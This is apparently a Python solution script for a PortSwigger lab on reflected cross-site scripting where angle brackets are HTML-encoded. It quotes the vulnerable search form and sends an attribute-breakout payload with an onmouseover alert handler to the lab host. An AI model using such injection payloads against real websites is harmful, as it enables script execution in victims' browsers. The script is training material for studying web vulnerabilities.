'''
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.

Lab link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
'''

'''Vulnurable code in search script
<section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search value="PAYLOAD">
                            <button type=submit class=button>Search</button>
                        </form>
'''

import requests


lab_id = '0a11009404cea52583dfb0c300cd0067' #change based on generated lab
payload = 'hacked" onmouseover=alert(\'hi\')"' # trigger an onload event by injecting into the PAYLOAD section above
uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 

r = requests.get(uri)
print('done')